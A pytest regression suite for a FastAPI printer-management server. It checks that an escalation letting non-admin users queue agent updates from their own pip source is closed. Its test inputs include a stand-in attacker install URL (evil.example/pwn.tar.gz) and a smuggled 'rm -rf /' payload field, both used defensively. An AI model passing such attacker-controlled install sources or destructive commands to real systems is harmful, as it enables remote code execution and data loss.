"""Privilege escalation via ``POST /api/v1/commands``.

The endpoint sat behind the router-wide ``require_staff`` gate with a free-form
``payload: Optional[dict]`` that was written to the queue verbatim. A tech-role
session could therefore enqueue ``update_agent`` with its own ``pip_source``,
which every site agent then pip-installs -- pip executes setup.py / PEP 517 build
hooks as the agent's service account (root under systemd, LocalSystem under
NSSM). That is remote code execution inside every client's LAN from a non-admin
account.

Three things close it, and each is pinned below: enqueue is admin-only, the
update source comes only from the admin-only ``agent.pip_source`` setting (a
caller-supplied one is refused, not silently dropped), and every payload key is
checked against what the agent's dispatcher actually consumes.
"""

from __future__ import annotations

from fastapi.testclient import TestClient
from sqlalchemy import select

from central import models as m
from central import runtime
from central.main import app
from central.security import hash_api_key, hash_password

PIP_SOURCE = "git+https://github.com/stephenthecold/printer-nanny.git#subdirectory=agent"
EVIL_SOURCE = "https://evil.example/pwn.tar.gz"


def _login(db, *, role: m.UserRole) -> TestClient:
    pwd = "pw" + role.value
    db.add(m.User(username=f"u_{role.value}", password_hash=hash_password(pwd), role=role))
    db.commit()
    cli = TestClient(app)
    resp = cli.post(
        "/login", data={"username": f"u_{role.value}", "password": pwd},
        follow_redirects=False,
    )
    assert resp.status_code == 303
    return cli


def _seed_agent(db) -> m.Agent:
    client = m.Client(name="Acme")
    db.add(client)
    db.flush()
    site = m.Site(client_id=client.id, name="HQ")
    db.add(site)
    db.flush()
    agent = m.Agent(site_id=site.id, name="hq-agent", api_key_hash=hash_api_key("pn_key"))
    db.add(agent)
    db.commit()
    return agent


def _commands(db) -> list[m.Command]:
    return list(db.scalars(select(m.Command)))


# ---- role gating ------------------------------------------------------------

def test_tech_cannot_enqueue_command(db):
    """Tech keeps the rest of the management API but loses command enqueue."""
    agent = _seed_agent(db)
    http = _login(db, role=m.UserRole.tech)
    r = http.post("/api/v1/commands", json={"agent_id": agent.id, "type": "rescan"})
    assert r.status_code == 403
    assert _commands(db) == []


def test_tech_cannot_enqueue_update_agent_with_own_pip_source(db):
    """The actual escalation: rejected at the door, before payload validation."""
    agent = _seed_agent(db)
    runtime.save_settings(db, {"agent.pip_source": PIP_SOURCE})
    http = _login(db, role=m.UserRole.tech)
    r = http.post("/api/v1/commands", json={
        "agent_id": agent.id, "type": "update_agent",
        "payload": {"pip_source": EVIL_SOURCE},
    })
    assert r.status_code == 403
    assert _commands(db) == []


def test_client_readonly_cannot_enqueue_command(db):
    agent = _seed_agent(db)
    http = _login(db, role=m.UserRole.client_readonly)
    r = http.post("/api/v1/commands", json={"agent_id": agent.id, "type": "rescan"})
    assert r.status_code == 403
    assert _commands(db) == []


def test_unauthenticated_cannot_enqueue_command(db):
    agent = _seed_agent(db)
    r = TestClient(app).post("/api/v1/commands", json={"agent_id": agent.id, "type": "rescan"})
    assert r.status_code == 401
    assert _commands(db) == []


def test_admin_can_enqueue_command(db):
    agent = _seed_agent(db)
    http = _login(db, role=m.UserRole.admin)
    r = http.post("/api/v1/commands", json={"agent_id": agent.id, "type": "rescan"})
    assert r.status_code == 201
    assert r.json()["type"] == "rescan"
    cmds = _commands(db)
    assert len(cmds) == 1
    assert cmds[0].agent_id == agent.id
    assert cmds[0].status == m.CommandStatus.pending


# ---- payload validation -----------------------------------------------------

def test_caller_supplied_pip_source_is_rejected(db):
    """Refused loudly rather than stripped: a silent strip would hide the attempt
    behind a 201. Nothing is queued."""
    agent = _seed_agent(db)
    runtime.save_settings(db, {"agent.pip_source": PIP_SOURCE})
    http = _login(db, role=m.UserRole.admin)
    r = http.post("/api/v1/commands", json={
        "agent_id": agent.id, "type": "update_agent",
        "payload": {"pip_source": EVIL_SOURCE},
    })
    assert r.status_code == 422
    assert "pip_source" in r.text
    assert _commands(db) == []


def test_pip_source_rejected_on_any_command_type(db):
    """Not just update_agent -- no request may name an install source at all."""
    agent = _seed_agent(db)
    http = _login(db, role=m.UserRole.admin)
    r = http.post("/api/v1/commands", json={
        "agent_id": agent.id, "type": "poll_printer",
        "payload": {"ip": "10.0.0.5", "pip_source": EVIL_SOURCE},
    })
    assert r.status_code == 422
    assert _commands(db) == []


def test_unknown_payload_key_is_rejected(db):
    agent = _seed_agent(db)
    http = _login(db, role=m.UserRole.admin)
    r = http.post("/api/v1/commands", json={
        "agent_id": agent.id, "type": "poll_printer",
        "payload": {"ip": "10.0.0.5", "cmd": "rm -rf /"},
    })
    assert r.status_code == 422
    assert "cmd" in r.text
    assert _commands(db) == []


def test_payload_on_payload_less_command_is_rejected(db):
    """rescan/poll_now take no payload at all -- the agent reads none."""
    agent = _seed_agent(db)
    http = _login(db, role=m.UserRole.admin)
    r = http.post("/api/v1/commands", json={
        "agent_id": agent.id, "type": "rescan", "payload": {"ip": "10.0.0.5"},
    })
    assert r.status_code == 422
    assert _commands(db) == []


def test_each_command_type_still_enqueues(db):
    """Every legitimate type an admin can queue, with its allowed payload."""
    agent = _seed_agent(db)
    runtime.save_settings(db, {"agent.pip_source": PIP_SOURCE})
    http = _login(db, role=m.UserRole.admin)
    cases = [
        ("rescan", None, None),
        ("poll_now", None, None),
        ("poll_printer", {"ip": "10.0.0.5"}, {"ip": "10.0.0.5"}),
        ("poll_printer", {"printer_id": 7, "ip": "10.0.0.6"},
         {"printer_id": 7, "ip": "10.0.0.6"}),
        ("update_config", None, None),
        ("update_agent", None, {"pip_source": PIP_SOURCE}),
    ]
    for ctype, payload, expected in cases:
        body = {"agent_id": agent.id, "type": ctype}
        if payload is not None:
            body["payload"] = payload
        r = http.post("/api/v1/commands", json=body)
        assert r.status_code == 201, (ctype, r.text)
        cmd = db.get(m.Command, r.json()["id"])
        assert cmd.type == m.CommandType(ctype)
        assert cmd.payload == expected, ctype


def test_update_agent_uses_configured_pip_source(db):
    """The queued source is the admin-only setting, byte for byte -- same value
    the dashboard's /manage/agents/{id}/update queues."""
    agent = _seed_agent(db)
    runtime.save_settings(db, {"agent.pip_source": PIP_SOURCE})
    http = _login(db, role=m.UserRole.admin)
    r = http.post("/api/v1/commands", json={"agent_id": agent.id, "type": "update_agent"})
    assert r.status_code == 201
    assert r.json()["payload"] == {"pip_source": PIP_SOURCE}


def test_update_agent_refused_while_pip_source_is_the_placeholder(db):
    """Mirrors the dashboard guard: the shipped 'your-org' placeholder would
    fail to install on every agent at once."""
    agent = _seed_agent(db)
    runtime.save_settings(db, {
        "agent.pip_source": "git+https://github.com/your-org/printer-nanny.git#subdirectory=agent",
    })
    http = _login(db, role=m.UserRole.admin)
    r = http.post("/api/v1/commands", json={"agent_id": agent.id, "type": "update_agent"})
    assert r.status_code == 409
    assert _commands(db) == []


def test_enqueue_for_unknown_agent_404s(db):
    http = _login(db, role=m.UserRole.admin)
    r = http.post("/api/v1/commands", json={"agent_id": 999, "type": "rescan"})
    assert r.status_code == 404
    assert _commands(db) == []


# ---- audit ------------------------------------------------------------------

def test_enqueue_is_audited(db):
    agent = _seed_agent(db)
    runtime.save_settings(db, {"agent.pip_source": PIP_SOURCE})
    http = _login(db, role=m.UserRole.admin)
    assert http.post(
        "/api/v1/commands", json={"agent_id": agent.id, "type": "update_agent"},
    ).status_code == 201
    rows = list(db.scalars(select(m.AuditLog).where(m.AuditLog.action == "command.enqueue")))
    assert len(rows) == 1
    assert rows[0].username == "u_admin"
    assert f"agent:{agent.id}" in rows[0].target
    assert "update_agent" in rows[0].detail


def test_refused_enqueue_writes_no_command_and_no_audit_row(db):
    agent = _seed_agent(db)
    http = _login(db, role=m.UserRole.tech)
    http.post("/api/v1/commands", json={"agent_id": agent.id, "type": "rescan"})
    assert _commands(db) == []
    assert list(db.scalars(
        select(m.AuditLog).where(m.AuditLog.action == "command.enqueue"))) == []
